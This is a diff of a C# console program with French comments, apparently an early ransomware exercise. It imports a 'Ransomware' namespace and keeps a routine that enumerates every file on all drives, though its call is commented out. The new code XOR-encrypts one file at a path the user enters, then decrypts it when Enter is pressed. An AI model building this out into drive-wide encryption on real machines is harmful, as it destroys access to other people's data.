@@ -4,9 +4,17 @@ using System;
 using System.IO;
 using System.Collections;
 using System.Security.AccessControl;
+using System.Runtime.CompilerServices;
+using System.Text;
+using Ransomware;
+
+
+
+
+byte[] _key;
 
 // Convertit un tableau quelconque en liste
-List<T> ConvertArrayToList<T> (T[] elem)
+List<T> ConvertArrayToList<T>(T[] elem)
 {
     var res = new List<T>();
     foreach (var co in elem)
@@ -15,6 +23,7 @@ List<T> ConvertArrayToList<T> (T[] elem)
     }
     return res;
 }
+
 
 // Permet d'énumérer tous les fichiers pour chaque lecteur
 void AllFiles()
@@ -58,4 +67,22 @@ void SubDirectory(string path)
 }
 
 
-AllFiles();
+
+
+
+
+//AllFiles();
+Console.WriteLine("Rentrer la clé de chiffrement :\n");
+string key = Console.ReadLine();
+Console.WriteLine("Saisissez le path du fichier à chiffrer :\n");
+string path = Console.ReadLine();
+
+// Chiffrement
+XOR Encryptor = new XOR(key);
+Encryptor.encrypt(path);
+Console.WriteLine("Le fichier a bien été chiffré\n");
+Console.WriteLine("Taper sur entrer pour déchiffrer\n");
+Console.ReadLine();
+Encryptor.encrypt(path);
+Console.WriteLine("Le fichier a été déchiffré");
+
